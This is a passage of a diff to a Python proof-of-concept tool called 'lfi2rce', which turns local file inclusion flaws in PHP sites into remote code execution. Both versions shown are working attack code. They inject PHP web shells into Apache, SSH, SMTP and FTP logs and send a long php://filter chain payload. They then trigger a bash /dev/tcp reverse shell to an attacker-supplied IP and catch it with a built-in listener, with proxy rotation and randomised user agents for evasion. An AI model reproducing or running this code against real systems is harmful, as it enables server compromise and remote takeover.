@@ -2,365 +2,451 @@
 
 # lfi2rce (PoC) by 0bfxgh0st*
 
-import requests
-import sys
-import os
-import time
+import requests,socket,paramiko,threading,sys,time,base64,random,ast
 from urllib.parse import urlparse
-import base64
-import threading
-import socket
 
-print ("lfi2rce - Local File Inclusion To Remote Code Execution v1.0 by 0bfxgh0st*\n")
-
-####################################################################
-apache_file_to_poison='/var/log/apache2/access.log'                #
-ssh_file_to_poison='/var/log/auth.log'                             #
-smtp_file_to_poison='/var/log/mail.log'                            #
-ftp_file_to_poison='/var/log/vsftpd.log'                           #
-windows_apache_file_to_poison='C:/xampp/apache/logs/access.log'    #
-target_ssh_port='22'                                               #
-target_smtp_port='25'                                              #
-target_ftp_port='21'                                               #
-####################################################################
+print ("lfi2rce - Local File Inclusion To Remote Code Execution v1.1 by 0bfxgh0st*\n")
 
 def Help():
 
 	print ("Usage python3 lfi2rce -u <lfi vulnerable url> -t <poison type> -r <attacker ip> -p <attacker port>\n")
 	print ("Options:\n")
-	print ("    -u <url>")
-	print ("    -t <poison type>")
-	print ("    -r <attacker ip address>")
-	print ("    -p <attacker port>\n")
-	print ("Cookie mode:                  (lfi2rce via cookies)\n")
-	print ("    --cookie <name>\n")
-	print ("Override default log paths:   (this will follow selected poison type schema)\n")
-	print ("    -l <log file>\n")
-	print ("Poison types:\n")
-	print ("    apache       apache2 log poison          (default path: " + apache_file_to_poison + ")")
-	print ("    ssh          ssh log poison              (default path: " + ssh_file_to_poison + ")")
-	print ("    smtp         smtp log poison             (default path: " + smtp_file_to_poison + ")")
-	print ("    ftp          ftp log poison              (default path: " + ftp_file_to_poison + ")")
-	print ("    windows      windows apache log poison   (default path: " + windows_apache_file_to_poison + ")\n")
-	print ("Examples:\n")
-	print ('    python3 lfi2rce -u "http://ghost.server/index.php?file=" -t apache -r 10.0.2.15 -p 1337 -l /var/log/apache2/error.log')
-	print ('    python3 lfi2rce -u "http://ghost.server/index.php?page=" -t ssh -r 10.0.2.15 -p 1337')
-	print ('    python3 lfi2rce -u "http://ghost.server/index.php?search=" -t smtp -r 10.0.2.15 -p 1337 -l /var/mail/secure/mail.log')
-	print ('    python3 lfi2rce -u "http://ghost.server/index.php?search=" -t ftp -r 10.0.2.15 -p 1337')
-	print ('    python3 lfi2rce -u "http://ghost.winserver/index.php?s=" -t windows -r 10.0.2.15 -p 1337')
-	print ('    python3 lfi2rce -u "http://ghost.server/index.php" -t ftp -r 10.0.2.15 -p 1337 --cookie session')
+	print ("    -u, --url <url>                          Url (Url must contain LFI vulnerable parameter if not --cookie-mode or --data-mode flag is set)")
+	print ("    -t, --poison-type <poison type>          Poison scheme (filterchain,apache,ssh,ftp,smtp)")
+	print ("    -r, --host <ip>                          Our machine IP address")
+	print ("    -p, --port <port>                        Our machine port")
+	print ("    -X, --method <method>                    Select request method")
+	print ("    -d, --data <dict>                        Send HTTP post data")
+	print ("    -l, --log <log file>                     Log file to poison")
+	print ("    -H, --headers <dict>                     HTTP headers")
+	print ("    -c, --cookies <dict>                     Send cookies")
+	print ("    --cookie-mode <key>                      LFI2RCE via cookies")
+	print ("    --data-mode <key>                        LFI2RCE via data")		
+	print ("    --basic-auth <user> <password>           Basic HTTP authentication")	
+	print ("    --ssh-port <n>                           Remote SSH port")
+	print ("    --ftp-port <n>                           Remote FTP port")
+	print ("    --smtp-port <n>                          Remote SMTP port")
+	print ("    --proxy <proxy>                          Use proxies")
+	print ("    --proxy-file <file>                      Read proxies from input file")
+	print ("    --delay <n>                              Set delay time in seconds between retry requests")
+	print ("    -h, --help                               Show help panel")
+	print ("    -e, --examples                           Show help panel with use examples\n")
+	print ("Poison/lfi2rce types:\n")
+	print ("    filterchain           linux php filter chain            (*** no file or log needed ***)")
+	print ("    apache-lin            linux apache log poison           (default path: /var/log/apache2/access.log)")
+	print ("    ssh-lin               linux ssh log poison              (default path: /var/log/auth.log)")
+	print ("    smtp-lin              linux smtp log poison             (default path: /var/log/mail.log)")
+	print ("    ftp-lin               linux ftp log poison              (default path: /var/log/vsftpd.log)")
+	print ("    apache-win            windows apache log poison         (default path: C:/xampp/apache/logs/access.log)")
+	print ("    ssh-win               windows ssh log poison            (default path: C:/ProgramData/ssh/logs/sshd.log)")
+	print ("    smtp-win              windows smtp log poison           (default path: C:/xampp/MercuryMail/LOGS/MERCURYS.LOG)")
+	print ("    ftp-win               windows ftp log poison            (default path: C:/inetpub/logs/LogFiles/FTPSVC1/u_ex991231.log)")
+	if '-e' in sys.argv or '--examples' in sys.argv:
+		print ("\nExamples:\n")
+		print ('    python3 lfi2rce -u "http://ghost.server/index.php?query=" -t filterchain -r 10.0.2.15 -p 1337')
+		print ('    python3 lfi2rce -u "http://ghost.server/index.php?query=" -t filterchain -r 10.0.2.15 -p 1337 --cookie-mode id')
+		print ('    python3 lfi2rce -u "http://ghost.server/index.php?file=" -t apache-lin -r 10.0.2.15 -p 1337 -l /var/log/apache2/error.log ')
+		print ('    python3 lfi2rce -u "http://ghost.server/index.php?page=" -t ssh-win -r 10.0.2.15 -p 1337')
+		print ('    python3 lfi2rce -u "http://ghost.server/index.php?search=" -t smtp-lin -r 10.0.2.15 -p 1337 -l /var/mail/secure/mail.log')
+		print ('    python3 lfi2rce -u "http://ghost.server/index.php?search=" -t ftp-win -r 10.0.2.15 -p 1337')
+		print ('    python3 lfi2rce -u "http://ghost.winserver/index.php?s=" -t apache-win -r 10.0.2.15 -p 1337 -X POST -d \'{"id":"0","role":"admin"}\'')
+		print ('    python3 lfi2rce -u "http://ghost.server/index.php" -t ftp-lin -r 10.0.2.15 -p 1337 --cookie-mode session --cookies \'{"id":"1","role":"user"}\'')
+		print ('    python3 lfi2rce -u "http://ghost.server/index.php?file=" -t apache-win -r 10.0.2.15 -p 1337 --headers \'{"User-Agent":"Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12B466","connection":"keep-alive"}\'')
+		print ('    python3 lfi2rce -u "http://ghost.server/index.php?file=" -t apache-lin -r 10.0.2.15 -p 1337 --proxy "http://127.0.0.1:8080,https://127.0.0.1:5473,socks5://127.0.0.1:4213"')
+		print ('    python3 lfi2rce -u "http://ghost.server/index.php?file=" -t apache-lin -r 10.0.2.15 -p 1337 --proxy-file proxies.txt')
 
-def autoconnect():
+if len(sys.argv) < 9 or '-h' in sys.argv or '--help' in sys.argv:
+	Help()
+	sys.exit(1)
 
-	os.system('nc -lvp ' + attacker_port)
-	
-def linux_apache_log_poison():
+def randomUA():
 
-	payload='bash%20-c%20%27bash%20-i%20>%26%20/dev/tcp/' + attacker_ip + '/' + attacker_port + '%200>%261%27%26'      # m30w's with @GatoGamer1155
-	print ("💀 Poison " + apache_file_to_poison)
-	headers = { "User-Agent": "<?php $sysvar='system';echo $sysvar($_GET['cmd']); ?>" }
-	print ("💀 Sending payload\n")
-	
-	if ck == True:
+	UA = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
+	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9",
+	"Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
+	"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",
+	"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
+	"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
+	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
+	"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17",
+	"Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",
+	"Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4",
+	"Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0",
+	"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
+	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
+	"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",
+	"Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0",
+	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17",
+	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
+	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
+	"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
+	"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
+	"Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53",
+	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:40.0) Gecko/20100101 Firefox/40.0",
+	"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
+	"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
+	"Mozilla/5.0 (X11; CrOS x86_64 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/7.1.7 Safari/537.85.16"]	
+	ua = random.choice(UA)
+	return ua
 
-		requests.get(url, cookies={cookie:apache_file_to_poison}, headers=headers)
-
-	else:
-	
-		requests.get(url + apache_file_to_poison, headers=headers)
-	
-	c = threading.Thread(target=autoconnect)
-	c.start()
-
-	while True:
-
-		try:
-
-			if ck == True:
-	
-				requests.get(url + '?' + cookie + '=' + apache_file_to_poison + '&cmd=' + payload, cookies={cookie:apache_file_to_poison})
-				time.sleep(1)
-
-			else:
-				requests.get(url + apache_file_to_poison + '&cmd=' + payload)	
-				time.sleep(1)				
-	
-		except KeyboardInterrupt:
-
-			sys.exit(1)
-
-def linux_ssh_log_poison():
-
-	payload='bash%20-c%20%27bash%20-i%20>%26%20/dev/tcp/' + attacker_ip + '/' + attacker_port + '%200>%261%27%26'
-	print ("💀 Poison " + ssh_file_to_poison)
-	print ("💀 Sending payload\n")
-	os.system("ssh '<?php system($_GET[\"cmd\"]); ?>'@" + target_host + ' -p ' + target_ssh_port)
-	c = threading.Thread(target=autoconnect)
-	c.start()
-	
-	if ck == True:
-	
-		requests.get(url + '?' + cookie + '=' + ssh_file_to_poison + '&cmd=' + payload, cookies={cookie:ssh_file_to_poison})
-	
-	else:
-	
-		requests.get(url + ssh_file_to_poison + '&cmd=' + payload)
-
-def linux_smtp_log_poison():
-
-	payload='bash%20-c%20%27bash%20-i%20>%26%20/dev/tcp/' + attacker_ip + '/' + attacker_port + '%200>%261%27%26'
-	print ("💀 Poison " + smtp_file_to_poison)
-	print ("💀 Sending payload\n")
-	os.system("{ printf \"MAIL FROM:<unknow@mail.com>\n\"; sleep 1; printf \"RCPT TO:<?php system(\$_GET['cmd']); ?>\n\"; sleep 1; } | telnet " + target_host + " " + target_smtp_port)
-	c = threading.Thread(target=autoconnect)
-	c.start()
-	
-	if ck == True:
-
-		requests.get(url + '?' + cookie + '=' + smtp_file_to_poison + '&cmd=' + payload, cookies={cookie:smtp_file_to_poison})
-	
-	else:
-	
-		requests.get(url + smtp_file_to_poison + '&cmd=' + payload)
-
-def linux_ftp_log_poison():
-
-	payload='bash%20-c%20%27bash%20-i%20>%26%20/dev/tcp/' + attacker_ip + '/' + attacker_port + '%200>%261%27%26'
-	print ("💀 Poison " + ftp_file_to_poison)
+def bind(attacker_port):
 
 	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-		s.connect((target_host,int(target_ftp_port)))
-		data = s.recv(1024)
-		#print(data.decode('utf-8'))
-		s.sendall(b'USER <?php system($_GET["cmd"]); ?>\n')
-		data = s.recv(1024)
-		#print(data.decode('utf-8'))
-		s.sendall(b'PASS 1234\n')
-		data = s.recv(1024)
-		#print(data.decode('utf-8'))
+		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+		s.bind(('0.0.0.0',int(attacker_port)))
+		s.listen()
+		print('listening on [any] ' + str(attacker_port) + ' ...')
+		conn,addr = s.accept()
+		print('connect to [' + conn.getsockname()[0] + '] from [' + addr[0] + '] ' + str(addr[1]))
 
-	print ("💀 Sending payload\n")
-	c = threading.Thread(target=autoconnect)
-	c.start()
-	
+	def recv():
+		buffersize = 1024
+		while True:
+			data = conn.recv(buffersize)
+			sys.stdout.flush()
+			sys.stdout.write(data.decode())
+			sys.stdout.flush()
+	t = threading.Thread(target=recv)
+	t.start()
 	while True:
-	
-		try:
 		
-			if ck == True:
-			
-				requests.get(url + '?' + cookie + '=' + ftp_file_to_poison + '&cmd=' + payload, cookies={cookie:ftp_file_to_poison})
-			
+		stdin = (input()+'\n').encode('utf-8')
+		conn.sendall(stdin)
+
+def filterchain(headers,payload,attacker_port):
+
+	filterchainpayload='php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp'
+	if not 'User-Agent' in headers:
+		headers.update(o_headers)
+	c = threading.Thread(target=bind,args=(attacker_port,))
+	c.start()		
+	if cookie_mode == True:
+		vookies={cookie:filterchainpayload}
+		cookies_copy = dict(cookies)
+		cookies_copy.update(vookies)
+		vookies = cookies_copy
+		requests.request(method, url + '?&cmd=' + payload, cookies=vookies , headers=headers, proxies=proxies, data=data, auth=auth)
+	if data_mode == True:
+		dato={indata:filterchainpayload}
+		data_copy = dict(data)
+		data_copy.update(dato)
+		dato = data_copy
+		requests.request(method, url + '?&cmd=' + payload, cookies=cookies, headers=headers, proxies=proxies, data=dato, auth=auth)
+	else:
+		requests.request(method, url + filterchainpayload + '&cmd=' + payload, cookies=cookies , headers=headers, proxies=proxies, data=data, auth=auth)	
+
+def apache(headers,payload,attacker_port):
+
+	print ("💀 Poison " + apache_log)
+	print ("💀 Sending payload\n")	
+	headers_copy = dict(headers)
+	headers.update(h) 	
+	if cookie_mode == True:
+		vookies={cookie:apache_log}
+		cookies_copy = dict(cookies)
+		cookies_copy.update(vookies)
+		vookies = cookies_copy
+		requests.request(method, url, cookies=cookies, headers=headers, proxies=proxies, data=data, auth=auth)
+	if data_mode == True:
+		dato={indata:apache_log}
+		data_copy = dict(data)
+		data_copy.update(dato)
+		dato = data_copy
+		requests.request(method, url, cookies=cookies , headers=headers, proxies=proxies, data=data, auth=auth)
+	else:	
+		requests.request(method, url, cookies=cookies, headers=headers, proxies=proxies, data=data, auth=auth)
+		
+	c = threading.Thread(target=bind,args=(attacker_port,))
+	c.start()	
+	headers = headers_copy
+	if not 'User-Agent' in headers:
+		headers.update(o_headers)	
+	while True:
+		try:
+			if cookie_mode == True:
+				requests.request(method, url + '?&cmd=' + payload, cookies=vookies, headers=headers, proxies=proxies, data=data, auth=auth)
+
+			if data_mode == True:
+				requests.request(method, url + '?&cmd=' + payload, cookies=cookies, headers=headers, proxies=proxies, data=dato, auth=auth)				
 			else:
-				requests.get(url + ftp_file_to_poison + '&cmd=' + payload)
-				time.sleep(1)
-
+				requests.request(method, url + apache_log + '&cmd=' + payload, cookies=cookies, headers=headers, proxies=proxies,data=data, auth=auth)
+				
 		except KeyboardInterrupt:
+			sys.exit(1)
+		time.sleep(retry_time)
+		
+def ssh(headers,payload,attacker_port):
 
+	print ("💀 Poison " + ssh_log)
+	print ("💀 Sending payload\n")
+	username='<?php system($_GET["cmd"]); ?>'
+	password=''
+	ssh = paramiko.SSHClient()
+	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+	try:
+		ssh.connect(urlparse(url).hostname,ssh_port,username,password)
+	except:
+		pass	
+	c = threading.Thread(target=bind,args=(attacker_port,))
+	c.start()
+	if not 'User-Agent' in headers:
+		headers.update(o_headers)
+	if cookie_mode == True:
+		vookies={cookie:ssh_log}
+		cookies_copy = dict(cookies)
+		cookies_copy.update(vookies)
+		vookies = cookies_copy	
+		requests.request(method,url + '?&cmd=' + payload, headers=headers, cookies=vookies,proxies=proxies, data=data, auth=auth)
+	if data_mode == True:
+		dato={indata:ssh_log}
+		data_copy = dict(data)
+		data_copy.update(dato)
+		dato = data_copy
+		requests.request(method, url + '?&cmd=' + payload, cookies=cookies, headers=headers, proxies=proxies, data=dato, auth=auth)
+	else:	
+		requests.request(method,url + ssh_log + '&cmd=' + payload, cookies=cookies,headers=headers, proxies=proxies, data=data, auth=auth)
+
+def smtp(headers,payload,attacker_port):
+
+	print ("💀 Poison " + smtp_log)
+	print ("💀 Sending payload\n")	
+	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+		s.connect((urlparse(url).hostname,int(smtp_port)))
+		s.sendall(b'MAIL FROM:<unknow@mail.com>\n')
+		time.sleep(1)
+		s.sendall(b'RCPT TO:<?php system($_GET["cmd"]); ?>\n')
+		time.sleep(0.001)
+	c = threading.Thread(target=bind,args=(attacker_port,))
+	c.start()
+	if not 'User-Agent' in headers:
+		headers.update(o_headers)
+	if cookie_mode == True:
+		vookies={cookie:smtp_log}
+		cookies_copy = dict(cookies)
+		cookies_copy.update(vookies)
+		vookies = cookies_copy
+		requests.request(method,url + '?cmd=' + payload, cookies=vookies, headers=headers, proxies=proxies, data=data, auth=auth)
+	if data_mode == True:
+		dato={indata:smtp_log}
+		data_copy = dict(data)
+		data_copy.update(dato)
+		dato = data_copy
+		requests.request(method, url + '?&cmd=' + payload, cookies=cookies, headers=headers, proxies=proxies, data=dato, auth=auth)			
+	else:	
+		requests.request(method,url + smtp_log + '&cmd=' + payload, cookies=cookies, headers=headers, proxies=proxies, data=data, auth=auth)
+
+def ftp(headers,payload,attacker_port):
+
+	print ("💀 Poison " + ftp_log)
+	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+		s.connect((urlparse(url).hostname,int(ftp_port)))
+		if target_os == 'win':
+			s.sendall(b'<?php system($_GET["cmd"]);?>\r\n')
+		elif target_os == 'lin':
+			s.sendall(b'USER <?php system($_GET["cmd"]); ?>\n')
+			s.sendall(b'PASS 1234\n')
+			time.sleep(0.001)
+	print ("💀 Sending payload\n")	
+	c = threading.Thread(target=bind,args=(attacker_port,))
+	c.start()
+	if not 'User-Agent' in headers:
+		headers.update(o_headers)
+	while True:	
+		try:		
+			if cookie_mode == True:
+				vookies={cookie:ftp_log}
+				cookies_copy = dict(cookies)
+				cookies_copy.update(vookies)
+				vookies = cookies_copy
+				requests.request(method,url + '?&cmd=' + payload, cookies=vookies, headers=headers, proxies=proxies, data=data, auth=auth)
+				time.sleep(retry_time)
